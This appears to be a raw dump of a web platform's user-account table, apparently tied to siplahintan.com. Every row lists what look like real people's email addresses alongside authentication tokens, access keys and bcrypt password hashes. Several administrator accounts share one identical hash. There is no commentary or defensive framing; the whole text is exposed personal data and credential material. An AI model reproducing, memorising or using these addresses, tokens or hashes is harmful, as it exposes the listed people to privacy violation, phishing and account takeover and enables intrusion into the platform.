| 1184 | NULL                 | hironymussupriyanto@gmail.com                        | 2        | kUPeb59PoADlusKENxkmOqLleOI3so6u | timbulprad@gmail.com             | 1693188040 | 2021       | 1693188036 | 06BZ1kj7DhwTya7attuxMOAeRnDTfvL3mVwV85p7 | NULL         | $2y$13$QNWGiR5jHspYFknmofzgoOWQMQhvR1BuHLQDymoSeSvJQP25yA6iS |
| 1185 | NULL                 | simoeamd@gmail.com                                   | 1        | WInBiJqhiY4VdL3v6iEnSJ0LQuFa5fPs | simoeamd@gmail.com               | 1669019437 | 2021       | 1669019436 | uAbao7KUONJ94HWjomsyreh5fVWmdccTCdtTCiWu | NULL         | $2y$13$Y.CuFjCgNnFIxKd40RkhiOzhq42PyQp99Gb.8cJJX//kTSWWaoeq6 |
| 1186 | NULL                 | hatipahkirab@yahoo.co.id                             | 2        | 1boaMj30ZrAQBHSWB0T2sSkCPWrebyOP | hatipahkirab@yahoo.co.id         | 1635313870 | 2021       | 1635313869 | 3FdejfwHbGmwYx9cIam8Z47yhrhLh0BZwgIEoFYt | NULL         | <blank>                                                      |
| 1188 | NULL                 | idajuwaidahida@gmail.com                             | 1        | j9GvqCfFpv5Wxlw3948daaf0Vv5VkxUs | idajuwaidahida@gmail.com         | 1640579022 | 2021       | 1640579021 | B3DpjdryJ44R01SQvn6wTwmPhvHBVZvFsWpDhFLM | NULL         | <blank>                                                      |
| 1189 | NULL                 | nurhayatun.ayat@gmail.com                            | 1        | S5D4WrkimI18HBjVRgS8jFTsVUsHyLiT | nurhayatun.ayat@gmail.com        | 1699490083 | 2021       | 1699490081 | ieHc5iS17HYTlepqrHiepovbOQDicxg7YxPKn8rC | NULL         | $2y$13$B0I3UfiR.LbFzu72NqdgaOqjuvPN0Yu3FvFXlnhKiH1aEEOArH5Qy |
| 1190 | NULL                 | rizalbuol02@gmail.com                                | 1        | 452wqJMkw5d7hp6eQVa2HnI5roKnGI16 | rizalbuol02@gmail.com            | 1627300511 | 2021       | 2021       | CDcLm5r1nDZQB8cSSFbKk8DiJa0OQMe7hCA4PSsE | NULL         | <blank>                                                      |
| 1192 | NULL                 | sinarmurni@gmail.com                                 | 2        | deqBevwbBxU4bLpfRwu6J6lUN7flH82j | sinarmurni@gmail.com             | 1718425387 | 1628124239 | 1628124239 | 2r8cRoDhWGJqgxEghUqEukrqelgi86OarX2COU4p | NULL         | $2y$13$sUyDWdStyEfRFOaiUBW1Ne4QTbIZAgp/MEpNZf/HW.Ssw8g9jFRlK |
| 1193 | NULL                 | litaresmiati.ciniru@gmail.com                        | 1        | eGkyNuns9jgxHL0nfwkXOXshyg9ioLMK | litaresmiati1964@gmail.com       | 1719832516 | 1628224461 | 1719832514 | sUaZbfJvI9zyZs6g35Zi8l5zYmviVC0AbKB7MmMc | NULL         | $2y$13$2yp8ZPf4eDB3vSw/cEFR5etx7ZwFP5fcFPyNyCJDENfZq6hr9X1qu |
| 1194 | NULL                 | sunasantosan@gmail.com                               | 2        | vDaNODrb06pBcKZiUA4I62QWZJQw664K | sunasantosan@gmail.com           | 1719807529 | 1628228799 | 1719807527 | LyMAbts7apcqgMFxWju2qoIgtWt9wAhfFWXVDp44 | NULL         | $2y$13$K.WC9Ct7WJnEacfzGVzxKOBuIY6jWFk79yN4FPVKo/.dqiO4ewXyW |
| 1195 | NULL                 | pujiendi@gmail.com                                   | 2        | NpgdxQUCldGQgwfdzRNRp9QNPY2CIJer | pujiendi@gmail.com               | 1684755311 | 1628230827 | 1684755310 | 7Dcv3jg7seDNkOsK6tMzsv86ZOoDYNbuSUBTM0Vf | NULL         | $2y$13$LtF9OKwE8jOFeUDR6dGYpeiqiGLeBDnuAAOJVLRN.nE8zfmsS2Qy. |
| 1196 | NULL                 | marnisumarni3110@gmail.com                           | 1        | 0nnkLjZ85z7YvU9DTLdpdT1c6RTvC9Je | heriyahcrb1969@gmail.com         | 1628230981 | 1628230981 | 1628230981 | O1lmdgbGpPhwdQvc6tbQKJ3UPMLZ7PL13dBp328b | NULL         | <blank>                                                      |
| 1197 | NULL                 | spdaksan69@gmail.com                                 | 1        | CTADqLmGQHmNWTp1kTN3PRC7sPU2ymn0 | spdaksan69@gmail.com             | 1628232263 | 1628232263 | 1628232263 | PR0HMlbXaD0xJCIJvAk1R7oOZlxud7KezgSY3pUw | NULL         | <blank>                                                      |
| 1198 | NULL                 | dadangsukarna520@yahoo.co.id                         | 1        | NW57ViMWNT65AqG7p70Mkl9j64Bx9rJM | dadang.sca@gmail.com             | 1669705191 | 1628235912 | 1669705189 | aiganH2i0Mel5cXjiVDUVFfVrOnTSSVA5APXs0SC | NULL         | $2y$13$g8tyCZ3Ic4.AWkQE.J7CJuirmsC7Vc7jwMUoAq/t5cRofweiTkcee |
| 1199 | NULL                 | koswaraspd1964@gmail.com                             | 1        | 0uRp3czSaCCdy7tvhzztz0z2UJeqi9Wk | koswaraspd001@gmail.com          | 1635923176 | 1628240361 | 1635923176 | d7cgSYDpYjgDwHanIQevycGt7ysMHWayYZHQst4K | NULL         | <blank>                                                      |
| 1200 | NULL                 | erulawank@gmail.com                                  | 1        | s84tZ4rryAXvSBqk9xr3Qz207e2PA3xx | smafithrahinsanikepsek@gmail.com | 1718847735 | 1628259943 | 1718783897 | e66m2gAG36vB4KjE9t7u1H2AJMKuszS4nrrWQgd3 | NULL         | $2y$13$JgpkE1RxWLVOD4/3BNdfa.tmG4zFGPhGZCc60rCZF9fv8dd4G19i6 |
| 1201 | NULL                 | sninahermina@gmail.com                               | 1        | lREUWmOkd0EBHH7yhutya7KVj3tVy1bk | sninahermina@gmail.com           | 1628259999 | 1628259998 | 1628259998 | ztiSfwRKEEq0VkQHLqi5EYnLRqHQVWdjHp7OTeha | NULL         | <blank>                                                      |
| 1202 | NULL                 | jeni_lukas@yahoo.co.id                               | 2        | oIQVtQggx0AHcxZmcvo89pSPVbuXbZCQ | jenilukas126@gmail.com           | 1631180000 | 1628270389 | 1631180000 | ZIJ2qfCXAfWsbEHlRSYxsspVkIMMpTJ6PePcIRiu | NULL         | <blank>                                                      |
| 1203 | NULL                 | sundarisejati81@gmail.com                            | 1        | DvwuC7zuOYVVpaoIWRq9l519za3IA542 | sundarisejati81@gmail.com        | 1632448559 | 1628297382 | 1632448559 | AGXvw2dNNM9EYhlmNgpsEISCEPGIgW15uQfj4ZmE | NULL         | <blank>                                                      |
| 1204 | NULL                 | evikaniadewi72@gmail.com                             | 2        | Kycl2sOGzrEh2hD5p2MZSjr4RppPxK7u | evikaniadewi72@gmail.com         | 1631332176 | 1628298011 | 1631332175 | zNE2RUVqmP4vBoHYpqSpQRltd7pF6r6aC5vkZmKR | NULL         | <blank>                                                      |
| 1205 | NULL                 | hj.mariyanamantangai@gmail.com                       | 1        | 2P6U0KJ2PpzwwB5UCP2sixEN4Cg3FAnj | hjmariyana12@gmail.com           | 1642011753 | 1628298809 | 1642011753 | FLUBNMBCFGyw2sYAzSHqdUDCwTrPod5if0A1f8y3 | NULL         | <blank>                                                      |
| 1206 | NULL                 | sulazains@gmail.com                                  | 1        | nT7R17PdCxzlVriFMvSMqfyEPjFPfP26 | sulazains@gmail.com              | 1628299327 | 1628299326 | 1628299326 | EO715DWytjkVnwJSlfKMAPCDVycGRylIGJv8Mr6g | NULL         | <blank>                                                      |
| 1207 | NULL                 | iwihsuparta16@gmail.com                              | 2        | qBVoEEuEzyDbeIVY4GZ7z2SQnsXGGdpx | Iwih.suparta19@gmail.com         | 1652950554 | 1628303291 | 1652950553 | YGkUUF4zHcvRf1Qks226Jpah7lO8d971UtZo5iQD | NULL         | <blank>                                                      |
| 1208 | NULL                 | badrudindadang062@gmail.com                          | 1        | yBhkoM4p8Oc4a1HsWmy7syOJDe1WmbtQ | badrudindadang062@gmail.com      | 1628307822 | 1628307821 | 1628307821 | iwIpfUUmTEnbbhv70xFP2tlLtwF3bWhO7f7ODlzM | NULL         | <blank>                                                      |
| 1209 | NULL                 | sribudiani06@gmail.com                               | 1        | 5bKkqXzCDz9TPiDkHwBuzhH4HUITTM18 | sribudiani06@gmail.com           | 1662607943 | 1628311187 | 1662607942 | dXvckEma6CQRtSBQpSTK1knV6RPZcd3S5Ty37vyn | NULL         | <blank>                                                      |
| 1210 | NULL                 | astriratulangi27@gmail.com                           | 2        | laOkTWzCsP1YQLfuqfc0abF5INDzjwmD | astriratulangi27@gmail.com       | 1663589389 | 1628317700 | 1663589388 | RfrwDtcq5YzeXLhK93quBXeWvqHPBhAje4c4ZBhw | NULL         | <blank>                                                      |
| 1211 | NULL                 | nuryadi08051965@gmail.com                            | 1        | 5EysKdAmv4jxyqZdmgoB9QXHwo0N7est | nuryadi08051965@gmail.com        | 1628329872 | 1628329871 | 1628329871 | 7bpAEBi90rFC3v0h5VMq8PnGDcwO5TFrP6rc4F4r | NULL         | <blank>                                                      |
| 1212 | NULL                 | harminsuci@yahoo.com                                 | 1        | Vo4Du1exCPwQDPK7cWEK4XggARYfXN3P | harminsuci@yahoo.com             | 1722039502 | 1628394485 | 1721695451 | LLcgnI5zs0gKWDZ57V3n0c8H2NpDh3M97HU2l2cf | NULL         | $2y$13$O/uyiD4ZOPHQxq3EpK4MfepGh.hibUfXffXJNEIysfhhUwbmB/fBm |
| 1213 | NULL                 | tairah1313@gmail.com                                 | 1        | KSlDPvpx6xwDe4M9gcVYV1yjqFAeazvi | tairah1313@gmail.com             | 1635135870 | 1628395666 | 1635135870 | a8bEZnhnfg87VnSAZIZ0Wyn5yMtmlRqKKppuC3Ua | NULL         | <blank>                                                      |
| 1214 | NULL                 | habibah.hm@yahoo.com                                 | 1        | CAhLggn9FNPG4Qfmo7LP5k29nMvW4c55 | hm_habibah@yahoo.com             | 1698231053 | 1628395754 | 1698231052 | usePzR6ThgM1J8bGyWZN5dBt8H98amUend532ns5 | NULL         | $2y$13$gkhUn3PzjTvpsS0H.JPwbO.LTgoBeTgYUo9xSJSc5/hQ9sFNBe7Yq |
| 1215 | NULL                 | rifdahnawawi@yahoo.com                               | 1        | IQhdXqU1TiAapF7CV8VRSwvdGoXWAkdb | rifdahnawawi@yahoo.com           | 1655194176 | 1628396132 | 1655194175 | oAL2xtEqm55DRhp2FmMHsQV3wKrG0uTPncQnN4gG | NULL         | <blank>                                                      |
| 1216 | NULL                 | mariantitkislamnurussalammaros@gmail.com             | 2        | oQQFAANkReadqXOXiykVSCSiVkc3Uq2H | mariantimaros@gmail.com          | 1628426914 | 1628397033 | 1628426914 | a5cyS2FPMWfPJrvQzS0PtD3rNbpmadA7nqxU5GaN | NULL         | <blank>                                                      |
| 1217 | NULL                 | rahmanhguzali@gmail.com                              | 1        | azFKW8heAZNWgWtN9MKbWdB0PVND5bDZ | rahmanhguzali@gmail.com          | 1643015456 | 1628399306 | 1643015456 | XubojgIbtJuCLdI4XMFIFJmWnSDvkVC7TQCB93Qq | NULL         | <blank>                                                      |
| 1218 | NULL                 | hjmuliana65@gmail.com                                | 1        | yHEA4P3F7LxziZWCIG8TuwOioeuiOfB5 | hjmuliana65@gmail.com            | 1720511934 | 1628424938 | 1720222095 | 2sMhYut9gYNXDAEdknxNcPZ4gRSSMPFBDne6tWgV | NULL         | $2y$13$dfWZ4JhY8cp/cORM0w3l8ucvV8vOOZz7q5JQW/mrbMoN3HCd2dAgC |
| 1219 | NULL                 | hadijahhadijah@gmail.com                             | 1        | p9wyFDev8jnmLwZolgMk3zNDVawcVZMT | Syarifhadijah@gmail.com          | 1653095685 | 1628425506 | 1653095684 | klp8D9NLtKDfbvwIy76Ru0pctWWZuOyQqjMOw5rP | NULL         | <blank>                                                      |
| 1220 | NULL                 | hajars.pdi@yahoo.com                                 | 1        | tfFpsMWZuKXovscBm09aahFUJlg5aK7k | hajars.pdi@yahoo.com             | 1700566715 | 1628425548 | 1700566714 | Q9pjSO7FHTnmy3mq1Va4Zoi8utE772iG1a6iVWuZ | NULL         | $2y$13$e2383L/skhB53H4HazR9G.Uju407TDQNgOCn79zxAL4k8Ju68J9NG |
| 1221 | NULL                 | holidaynight4@gmail.com                              | 1        | B3KPyph9465xKjDZyaYlaXwP49EkEpyD | holidaynight4@gmail.com          | 1631444014 | 1628425862 | 1631444014 | zZcELqa13Oo3xpj1AjiZB0sQglQmo1NxI8djcc6X | NULL         | <blank>                                                      |
| 1222 | NULL                 | putrianggraeni0628@gmail.com                         | 1        | 78KxKJfyYlripKbNsxPi5AaqKOocDATl | putrianggraeni0628@gmail.com     | 1628426083 | 1628426082 | 1628426082 | KWkZPXuzeZX4E4L0GTbhRrxpConhUnbXJEpwDvr3 | NULL         | <blank>                                                      |
| 1223 | NULL                 | faridafaridah2020@gmail.com                          | 1        | 9bYFwvBWEZWdSIsz7IfaYd0OQ87E9TQj | faridafaridah2020@gmail.com      | 1655963783 | 1628426235 | 1655963782 | 1icNUODZvQQzjSqHwV5TLvo5ZYw2KXy5T17jEYRV | NULL         | <blank>                                                      |
| 1224 | NULL                 | damrahspd436@gmail.com                               | 2        | WlF29Sw6Wf4Qnje2cDSWFXIrZsRRN6bo | damrahspd436@gmail.com           | 1678963551 | 1628426366 | 1678963550 | lw9jm0uaLr547J21IIzM0DYfaQODilpOVFKchHyV | NULL         | $2y$13$AdC6BQUIe.BeROolGwT8xeKl325lAerMSOJj0Ic.np5otUwZVzPB6 |
| 1225 | NULL                 | sittiratnatamangesang@gmail.com                      | 2        | 2gmakSfKQQ7hpXdo4rhSC0A2PkKu3pRP | sittiratnatamangesang@gmail.com  | 1672385315 | 1628426495 | 1672385314 | fTi3yL7Nr5uQaz9SXSzB699AWQrGhkyYiKTY0X6b | NULL         | $2y$13$O4p0r.KsjujWnpw3iMlCceRYRyL8q4KigYxG.mP8aGC9ZNBPBVbem |
| 1226 | NULL                 | hjmaryam607@gmail.com                                | 1        | 9597JG50HPnmwvA6FqjjeCRpkqZOuUvt | sumarni.amir@yahoo.co.id         | 1628426656 | 1628426653 | 1628426653 | 2tvqzfKqBwVifrpo05jmmaPBkHcsRFUMQyp1BRbT | NULL         | <blank>                                                      |
| 1227 | NULL                 | Rahmatiaperintis79@gmail.com                         | 1        | 9FqKFNf3mUUpQs2mmoLaelmp3LKGdLKt | rahmatiaismail235@gmail.com      | 1632290033 | 1628426812 | 1632290030 | dMxY09ZrTZdnARlSBr6jVhnXLBegZwIHvOulGCgX | NULL         | <blank>                                                      |
| 1228 | NULL                 | hasnahs.pd@yahoo.com                                 | 1        | hpUxWYKpjKDRoIxobX8kX3IFyqJjTzDu | hasnahs.pd@yahoo.com             | 1706925754 | 1628427151 | 1705395733 | RPRDijVvTrnb892WbPheLXxrf12EwRSrtWujKPz7 | NULL         | $2y$13$2B0jCf0Y6wMSVm88LVy7D.i/JfYXy4OS6ufU/boUG28ZmiAq/q/0i |
| 1229 | NULL                 | hambalitanreang@gmail.com                            | 2        | 4AkY8CXxLiOzxiDjOkToBw4WoHyAaKnK | hambalitanreang@gmail.com        | 1628427245 | 1628427244 | 1628427244 | rwbO4we2nuetWxrFhR5ka5zeiYk4Hox9vIE0kyCD | NULL         | <blank>                                                      |
| 1230 | NULL                 | vivaindriana@gmail.com                               | 2        | ttE4MMYd32JWwwW19dBnc3AgaqLBwjxs | vivaindriana@gmail.com           | 1688694478 | 1628427613 | 1688694476 | o6Wv1PK9JSVi6hsprimCFlNLecL92KWZAu8I47NT | NULL         | $2y$13$rHXqjcxmDIXu/zckqh.4t.89lIjhDk5wIusIyBaaNplHdUjeA9Qvq |
| 1231 | NULL                 | labuanlombokntb@gmail.com                            | 1        | CjDr1IrEfcnACRRWr6aZTQNWiEcMLrVB | labuanlombokntb@gmail.com        | 1714100877 | 1628428423 | 1714100872 | ukN0mEy9NFVFvvUq93qEKrmZzPL8qQKRkgyl3HAR | NULL         | $2y$13$6dhrItGuH5X/7zIGgOUQM.505vniIHIyI44XPAN96VT2uoMwXHyEe |
| 1232 | NULL                 | radiah.thr@gmail.com                                 | 1        | lGuoge6gap5NgfcEv43O71aWXNmj86Uw | radiah.thr@gmail.com             | 1701052505 | 1628428553 | 1701052503 | x8ptJhLaJDdlHe1KJ7MqPRYYOUYIHKIXQFmYOJX1 | NULL         | $2y$13$Fw1ICopPJ0V.9FrxMYCPo.ZVZuRol8IMB8asdnWX70fuu/BUQvr4S |
| 1233 | NULL                 | malwathoni@gmail.com                                 | 2        | 78ElG5wCAaZ9hCiA6QyBDT0HQbzYZVJO | thonialwa38@gmail.com            | 1628465234 | 1628465233 | 1628465233 | hQwhpMn3zEaWba7v9Z7qwKNbaJcCQeoN5910rkNr | NULL         | <blank>                                                      |
| 1234 | NULL                 | sadariahkbnurannisa@gmail.com                        | 2        | vcrXtpB49ge5WOQWQFyHGwf7oMhQK6X1 | sadariahnurannisa@gmail.com      | 1632518180 | 1628469180 | 1632518179 | u9R8XMVGrfWsiy6MGdR3375hLIIn1voPLKqyyAAK | NULL         | <blank>                                                      |
| 1235 | NULL                 | werdiningsih0707@gmail.com                           | 1        | 2kq11VADMvAwVd3pbn2OyOn249LXIuOS | demmykus@gmail.com               | 1637135310 | 1628471167 | 1637135309 | 3Osd3gGr21nOQ8E9mzf5DwZ0ttTyUVfQnLmpUOih | NULL         | <blank>                                                      |
| 1236 | NULL                 | NULL                                                 | 1        | 1P2KpOC4zyHbdIpx8XHTibKNCDdskAGb | komaruddinmaraya64@gmail.com     | 1629957143 | 1628472135 | 1629957142 | InbZDsQ6yRnZLd7PKOmO9OCM83wqsABcm2ja96aH | NULL         | <blank>                                                      |
| 1237 | NULL                 | hasimasyari1971@gmail.com                            | 1        | 4sS3fTnYuMLGXjKbEvPwcfvc04XfYLkp | hasimasyari129@gmail.com         | 1638156686 | 1628474784 | 1638156685 | 2qKQ9veOnj8UT5UUTEGGZfLwyaArzMQCOG1SYhDB | NULL         | <blank>                                                      |
| 1238 | NULL                 | miun.gor11mtr@gmail.com                              | 1        | MvQRekig8JtpMkc9X2PLBjKQI17Z4V8p | idokgurupuncang@gmail.com        | 1628475006 | 1628475006 | 1628475006 | zzsqzmlvzbfnucaWTDR4c0b8AqDkxA2YznAURC9X | NULL         | <blank>                                                      |
| 1239 | NULL                 | kienalnyari1970@gmail.com                            | 1        | i5FYrC5s79jBjEr1kfVll586SVkTEitg | kienalnyari1970@gmail.com        | 1628475046 | 1628475045 | 1628475045 | sxh0HhXDPuQ9fbYufzO0eAicqkq8ZQKaKrTMSDAg | NULL         | <blank>                                                      |
| 1240 | NULL                 | kenzihimurasendiego@rocketmail.com                   | 1        | LpWgPlyheNCT4ggBipLeyKGbyTdn1yJM | kenzihimurasendiego@rocketmail.c | 1628475890 | 1628475888 | 1628475888 | mH7iLhUQeoABVg7CFQKjDhWD6u5lU1eljvSBgJmd | NULL         | <blank>                                                      |
| 1241 | NULL                 | hajahminasa@gmail.com                                | 2        | PAVFxbCvyLVlEmZSRPmL7t2zth4O0bdH | hajahminasa@gmail.com            | 1694663106 | 1628475980 | 1694663103 | GqYOMZJi8SUfjs46rCSZhEZ5QLDdUEgUq0X2Yt6q | NULL         | $2y$13$C7iVZvT5pzX4HtyofNqudOzjKW48j8zwjIHLnghTs/DVU6n9UEolm |
| 1242 | NULL                 | dododuriat053@gmail.com                              | 1        | YPqelemzw3gahLofkaeTNdyDgS7Qx4B2 | dododuriat053@gmail.com          | 1629950109 | 1628479754 | 1629950107 | mXPnjG6M5PxBpa4sp0kHGKbxJ8Pbv9zP5TVZ8Bnh | NULL         | <blank>                                                      |
| 1243 | NULL                 | anjarwatipgri@gmail.com                              | 2        | VLIYUuWAdBJMmK92ksYLWxA0dSvqVRsP | anjarwatipgri@gmail.com          | 1642135333 | 1628488254 | 1642135333 | yMyizOC9KoOuzv6lmMzpCAEUUIETPXoMfoS8muEg | NULL         | <blank>                                                      |
| 1244 | NULL                 | marulamlimbong3@gmail.com                            | 2        | QNqWhStG4XlD8-I-LP4nMDpoteAdvM5d | marulamlimbong3@gmail.com        | NULL       | 1628491405 | 1628491405 | TWlJuDHjPzKeQnMGfLNkjHhp8ybE3VrxHtpHUd3R | NULL         | $2y$13$2tf8c92CcSXf.oy05AoWn.4/cra9j0yTHAuPamZHCe3.wGGm1OCOq |
| 1245 | NULL                 | sholihahfatimah0@gmail.com                           | 1        | 8GQoePtPW2PzYb52U9jnSvgFbc5hircp | sholihahfatimah0@gmail.com       | 1704684472 | 1628493771 | 1704684470 | PiwURRDbR0YAv5M8jWcidmvngQfeyxVIhLvgxCoE | NULL         | $2y$13$iVAKR44vBa3Y/q4N5Ndt/.3T9vzJa3ZXqXzYq/3UCqiyBxsqKrYaO |
| 1246 | NULL                 | endangsumarni_kudus@yahoo.com                        | 1        | lrY21INkM3y9SYx5PPMQfebD7kXle30K | busumarni.e@gmail.com            | 1628497255 | 1628497254 | 1628497254 | H4pMxeRxxURYqLLz3k41Z3T4vXrn6fYHYPBWfOtk | NULL         | <blank>                                                      |
| 1247 | NULL                 | panut_tulasan@yahoo.co.id                            | 2        | Ahi6Q2ZKtLMHXV29kTIeDm5aqBDGtZLC | panut012020@gmail.com            | 1628554638 | 1628554636 | 1628554636 | WDfTMPi4qBGojC5rw3JiWbeCXLwD6IJHpbtTCTE7 | NULL         | <blank>                                                      |
| 1248 | NULL                 | m.amirullah64@yahoo.co.id                            | 2        | UwaApvbwxX2Y3YHFUal4rMLRy5o0Aw7U | m.amirullah64@gmail.com          | 1710722243 | 1628559659 | 1709212340 | 81rlFzVw0xfNm3qT4XG5S7mV0YvLYam3tZ1MqXPe | NULL         | $2y$13$0MyB.sfT5MY.pOr6ZB1H3.QUp3Hub4pSDvG6EABdyFcwsnuVgw2tu |
| 1249 | NULL                 | abdraup1965@gmail.com                                | 1        | U3ICrzl5OZ6sRYB41mzbOUPqHZDCDpoI | abdraup1965@gmail.com            | 1718411456 | 1628559713 | 1718411454 | N02RGIGJNW2WdKbvSoySmryijNAEaGQRioOxMIvz | NULL         | $2y$13$IeJeXm.TLe64sEbAU.lEnuO7oqGOLFUSqxvWiK2Xo4as7KLZ2Ftdm |
| 1250 | NULL                 | hamsah.smkn1tikke@gmail.com                          | 1        | EAW3dZsmh3js9kUiZnL0krgquHGojTIg | hamsahasyaraf@gmail.com          | 1655694549 | 1628567415 | 1655694548 | UmMC4G4jVpoV46NhG8PaR1RO5jwOdXKgCQ7t7rek | NULL         | <blank>                                                      |
| 1251 | NULL                 | nurandari9@gmail.com                                 | 2        | nundFwl1qLAdJT5fHA2qPWs0QVvf0ktf | nurandari52@gmail.com            | 1675564071 | 1628569591 | 1675564070 | WLllUBiree80jnLEiYqT9tUZpMpPFHP6qF7uTGBI | NULL         | $2y$13$XUoJCz947forSNYkaVeUw.muxmSn7MJM/nrC4WiGl8FX4Qe1jGC1m |
| 1252 | NULL                 | dwiyulianingsih233@gmail.com                         | 1        | iDt4Y1b3RaMJh4e7s06Vmc5Uv3Fwt4L2 | dwiyulianingsih233@gmail.com     | 1691653165 | 1628581402 | 1691653163 | Lgqc3tyROTHUjaemwTUSq13b9c9x5N4bLTnTe2PO | NULL         | $2y$13$qJtnDmpaKz0YUsJQb5TZnu.NaWV.4cBTiEHq4xLHe/bbss23509eS |
| 1253 | NULL                 | iyan.yuniar73@gmail.com                              | 1        | z6b52KzmaFQu1dhzIJgy1M8WpfmpMg5l | iyan.yuniar73@gmail.com          | 1628583329 | 1628583328 | 1628583328 | viMb57UeJWlJylrpUCOgwIVN8hNtbrYCDQmDsOpa | NULL         | <blank>                                                      |
| 1254 | NULL                 | puji.widianti@gmail.com                              | 1        | phxD3hLKxyaIwtdxyhOUhyhc5D5tjSBu | puji.widianti@gmail.com          | 1657162769 | 1628727038 | 1657162768 | OdxNkHfql9OjzAJG5oLMTzR9k100idjvMBUC1rlc | NULL         | <blank>                                                      |
| 1255 | NULL                 | novatarulylimbong10@gmail.com                        | 2        | TTXMauMWF-AqntoSWoh2m7bVWZ1kh_WQ | novatarulylimbong10@gmail.com    | 1628741156 | 1628741051 | 1628741051 | sMwJVNSNVGQeayVFUB-_I5QHy_3Cda4-RR7ajIi0 | NULL         | $2y$13$kvdGqdOFIQpWzgAL5EnNE.OUh6R5OCUWGQtMzy4Jz5nas.KcdANq6 |
| 1256 | NULL                 | baiq.muliasih07@gmail.com                            | 1        | rUHa2OVdeiljXIZvAiEzRZdRMkqLBeHw | baiqmuliasih86@gmail.com         | 1642124472 | 1628750183 | 1642124472 | WIrxXzdsE1ylMkNvBRdzp6Ye8ndX2v0aOAPHk4QB | NULL         | <blank>                                                      |
| 1257 | NULL                 | endang_sri11@yahoo.com                               | 2        | xDpYQa8BbBNlU1mKUcUzUaADr8FBnYvX | atanspd64@gmail.com              | 1628751855 | 1628751855 | 1628751855 | PGyAXdSwJTnU0n44VIy8iFe0ttj77UNtMYK5qWhP | NULL         | <blank>                                                      |
| 1258 | NULL                 | suhaksi123@gmail.com                                 | 2        | mumA1ZezeEMuhw1X3AQwlPX88D3Ag0qU | suhaksi123@gmail.com             | 1655109568 | 1628752603 | 1655109567 | wNWJ1Yb2h5MyV2vbRd5XgV7hC2x6oRdA8HCRhh7R | NULL         | <blank>                                                      |
| 1259 | NULL                 | NULL                                                 | 1        | nN0Ij8OjFGuIdYJ8R1qG8jMJebmIkmWJ | otonghidayat1402@gmail.com       | 1634793404 | 1628766725 | 1634793403 | bYjT5zw7fTiYv4hBQDQep2M9Wb2rnGXTvOblmi8C | NULL         | <blank>                                                      |
| 1260 | NULL                 | hayatiwd69@gmail.com                                 | 2        | RzKmwZRNxb6bAJ6JfzYeGSqprZNImXJW | hayatiwd69@gmail.com             | 1652755438 | 1628775472 | 1652755437 | FrA1397a3Uva5aqmdIjgFEaPHfUe7ZUW53ti2ZUI | NULL         | <blank>                                                      |
| 1261 | NULL                 | suparnonida@gmail.com                                | 2        | fVG7SEO0ZMxr2gEWdhu0wYvIyFOx2r7h | zia.suparno1963@gmail.com        | 1643015592 | 1628815618 | 1643015591 | adPvDDPh19Gexdo3Gjhk9hp2NcU5U69xTKfr77DX | NULL         | <blank>                                                      |
| 1262 | NULL                 | aaronadelbert@gmail.com                              | 1        | 6NBksGW0b3TLFwbz6TADiRt4MuTCDWZL | rahadianridwan777@gmail.com      | 1691660782 | 1628861633 | 1691660781 | Fil8UwDglPHJiwoLxt4iOZbr8tMqY8VL1kYlmapa | NULL         | $2y$13$3z1NFBBvCuEShKXUlPMsQee9UJtRyuf94aLbLsTVF2D.Dbnc.3ah2 |
| 1263 | NULL                 | adminpasar@siplahintan.com                           | 2        | lWIY3G33lkt7AgOjmzx-UXh7jT6OLgph | Tim Operasional                  | 1667468339 | 1629119397 | 1665731620 | N2MvR7FKZSlbSsymYw-ROwxvKnZUnSiqcSDAGOzU | NULL         | $2y$13$aCxkrs1DaF1HmgerEITTVOHR9aaRIzGUAB5XME5dx8OUbyovrnmSy |
| 1264 | NULL                 | adminpayment@siplahintan.com                         | 2        | FRHvXh09zJBPE7A_Gzji42NDYeQMymKW | adminpayment                     | 1695778842 | 1629119420 | 1629119420 | e2YVyE-opGITZkaN39FC-LsciWU9-pkv1--2sAaS | NULL         | $2y$13$wXugyL6Hx9OMJZ.zU1rS3ehxRhbPhsQtrhWlnuukKYPtznkQjjj.O |
| 1265 | NULL                 | kokomjuli27@gmail.com                                | 2        | dvcn1XdZ4iVTNg9At5RSllrfML8l5ZcV | kokomjuli27@gmail.com            | 1629340766 | 1629340765 | 1629340765 | 9zSUTSYbmpvwqRXmgdOQ6C7pnPZ5GKkCFVOW1LUa | NULL         | <blank>                                                      |
| 1266 | NULL                 | wijayaarif42@yahoo.co.id                             | 1        | F15nNdRL02ijlm18GPiuTf3xD9gtyO1r | wijayaarif42@yahoo.co.id         | 1639351265 | 1629603180 | 1639351265 | rrU62EBmZfGancQOMtRivF1iyd00qpgVtM6KCmnl | NULL         | <blank>                                                      |
| 1267 | NULL                 | oldistian1992@gmail.com                              | 2        | IZAMdghFfcrCfP1wIv_fAIakcJG77h7X | adminpasar2                      | NULL       | 1629697742 | 1629697742 | guz7ZGvFHNnMAL-VXv4E1lyY-cZzEVCBrIqQF-Es | NULL         | $2Y$13$vwCr8fhhymZyO.rahQNeL.4GokWehEot/aoAMyTMJXdrtLbrbkebK |
| 1268 | NULL                 | agung.broo92@gmail.com                               | 2        | _u5hInaS6PI0yqw_NXbSL4uo9d4Ut8cU | adminpasar3                      | 1630917315 | 1629697782 | 1629697782 | BJDuClpcfeAwwsJMJTEDM44AcVGHXv2F9dZhQlJp | NULL         | $2Y$13$vwCr8fhhymZyO.rahQNeL.4GokWehEot/aoAMyTMJXdrtLbrbkebK |
| 1269 | NULL                 | kaesang.hayyu14@yahoo.com                            | 2        | DPlPKZTFDUDEj0lnuLHNEIoYpIbnXQol | adminpasar4                      | 1630564937 | 1629697808 | 1629697808 | eFWLT47yDYr2H-iUI1kYsDq4lUoduhuOlf6SF7mc | NULL         | $2Y$13$vwCr8fhhymZyO.rahQNeL.4GokWehEot/aoAMyTMJXdrtLbrbkebK |
| 1270 | NULL                 | topik.feryanto1987@gmail.com                         | 2        | C3TBSHx3LbR4P88f7w53bdwjd5FeeG59 | adminpasar5                      | 1721878399 | 1629697831 | 1630998625 | kAOqujnd9_1EBeG_xlgm4T335MvDeBFbW4blUsD4 | NULL         | $2y$13$n5UANoHEx3dnSv7xlZ9h0O4VR29.mTKJjI38a7H8kEo9nGSdk/oEK |
| 1271 | NULL                 | ceo@pmastore.com                                     | 2        | bWT5OsZHUKLcyRWAFJEW7SDKivD_wVmy | ceo@pmastore.com                 | 1718425356 | 1629791655 | 1629791655 | 5CJcDWGxYokE0x69yVNhkxNAAjOfFaX2dYL_hIqN | NULL         | $2y$13$YuqiBMeOfaz71fhuQUWL5eOT/kvgL0B.bJZZMLHnpeNFZ2b21pFIm |
